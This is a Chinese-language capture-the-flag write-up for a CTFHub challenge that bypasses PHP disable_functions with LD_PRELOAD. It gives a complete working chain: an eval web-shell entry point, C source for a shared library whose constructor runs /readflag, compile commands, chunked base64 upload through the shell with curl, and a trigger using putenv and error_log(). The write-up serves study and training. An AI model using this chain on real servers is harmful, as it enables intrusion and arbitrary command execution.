# CTFHub Bypass disable_function - LD_PRELOAD

## 题目信息

- 平台：CTFHub
- 类型：Bypass disable_function
- 技术点：PHP WebShell、disable_functions、LD_PRELOAD、共享库构造函数
- 目标入口：`@eval($_REQUEST['ant']);`
- 最终 flag：`ctfhub{3b5800e230edfd2d817c54e9}`

## 解题思路

页面源码中存在：

```php
@eval($_REQUEST['ant']);
show_source(__FILE__);
```

因此可以通过 `ant` 参数执行 PHP 代码：

```bash
curl -G "$TARGET" --data-urlencode "ant=echo 'test';"
```

但环境禁用了大量命令执行函数，例如：

```text
system, exec, shell_exec, popen, proc_open, passthru, mail
```

不能直接执行 `/readflag`。本题利用 `LD_PRELOAD`：让 PHP 间接启动的外部程序加载我们上传的 `.so`，在共享库构造函数中执行 `/readflag`，并将结果写到 `/tmp/result.txt`。

## 关键知识点

### 1. LD_PRELOAD

`LD_PRELOAD` 是 Linux 动态链接器使用的环境变量。程序启动时，会优先加载该变量指定的共享库。

如果共享库中定义了构造函数：

```c
__attribute__((constructor))
void init(void) {
    ...
}
```

那么共享库被加载时，`init()` 会自动执行。

### 2. 为什么不能在 macOS 编译

macOS 编译出的动态库格式是 `Mach-O`：

```text
Mach-O 64-bit dynamically linked shared library x86_64
```

Linux 靶机需要 `ELF`：

```text
ELF 64-bit LSB shared object, x86-64
```

所以需要在 Kali/Linux 环境中编译 `.so`。

### 3. 为什么不能直接读 /flag

本环境根目录下存在：

```text
/flag
/readflag
```

直接读取 `/flag` 失败，最终需要执行 `/readflag` 获取 flag。

## Payload 源码

文件：`ctfhub_ldpreload.c`

```c
#define _GNU_SOURCE
#include <stdlib.h>
#include <unistd.h>
#include <fcntl.h>
#include <sys/stat.h>

__attribute__((constructor))
void init(void) {
    unsetenv("LD_PRELOAD");

    int fd = open("/tmp/result.txt", O_WRONLY | O_CREAT | O_TRUNC, 0644);
    if (fd < 0) {
        return;
    }

    dup2(fd, 1);
    dup2(fd, 2);
    close(fd);

    execl("/readflag", "readflag", NULL);
}
```

## Kali 编译

```bash
gcc -fPIC -shared -o ctfhub_ldpreload.so ctfhub_ldpreload.c
file ctfhub_ldpreload.so
sha256sum ctfhub_ldpreload.so
base64 -w 0 ctfhub_ldpreload.so > ctfhub_ldpreload.so.b64
```

`file` 应输出类似：

```text
ctfhub_ldpreload.so: ELF 64-bit LSB shared object, x86-64
```

## 上传 .so 到靶机

由于 `.so` 是二进制文件，先 base64，再分块上传：

```bash
TARGET='http://challenge-3768e0286f400b2f.sandbox.ctfhub.com:10800/'

rm -f chunk_*

curl -G "$TARGET" --data-urlencode "ant=@unlink('/tmp/p.b64');@unlink('/tmp/p.so');@unlink('/tmp/result.txt');echo 'clean';"

split -b 1500 ctfhub_ldpreload.so.b64 chunk_

for f in chunk_*; do
  part=$(cat "$f")
  curl -s -G "$TARGET" --data-urlencode "ant=file_put_contents('/tmp/p.b64','$part',FILE_APPEND);echo filesize('/tmp/p.b64');"
  echo
done
```

远程解码并校验：

```bash
curl -G "$TARGET" --data-urlencode "ant=\$b=file_get_contents('/tmp/p.b64');file_put_contents('/tmp/p.so',base64_decode(\$b));echo 'sha256='.hash_file('sha256','/tmp/p.so').PHP_EOL;echo 'size='.filesize('/tmp/p.so').PHP_EOL;"
```

本地和远程 `sha256` 必须一致，否则说明上传损坏。

## 触发 LD_PRELOAD

本题中 `mail()` 被禁用，但 `error_log()` 可用：

```bash
curl -G "$TARGET" --data-urlencode "ant=putenv('LD_PRELOAD=/tmp/p.so');error_log('x',1,'a@b.c');echo 'triggered';"
```

然后读取输出：

```bash
curl -G "$TARGET" --data-urlencode "ant=echo @file_get_contents('/tmp/result.txt');"
```

得到：

```text
ctfhub{3b5800e230edfd2d817c54e9}
```

## 踩坑记录

1. 目标地址一开始用错，导致操作的是旧环境。
2. macOS 编译出的 `.so` 是 Mach-O，Linux 不能加载。
3. heredoc 的 `EOF` 前面不能有空格，否则 shell 会一直停在 `heredoc>`。
4. 上传二进制 `.so` 时不能直接塞进 URL 参数，应 base64 后分块上传。
5. 远程 `/tmp/p.so` 的 hash 必须和本地一致。
6. 旧 payload 只读 `/flag`，本题真正需要执行 `/readflag`。

## 总结

这题不是直接绕过 `disable_functions` 执行命令，而是利用 `LD_PRELOAD` 让 PHP 间接启动的外部程序加载恶意共享库。共享库加载时自动执行构造函数，构造函数中执行 `/readflag` 并把结果写入 `/tmp/result.txt`，最后再通过 PHP 读取该文件。
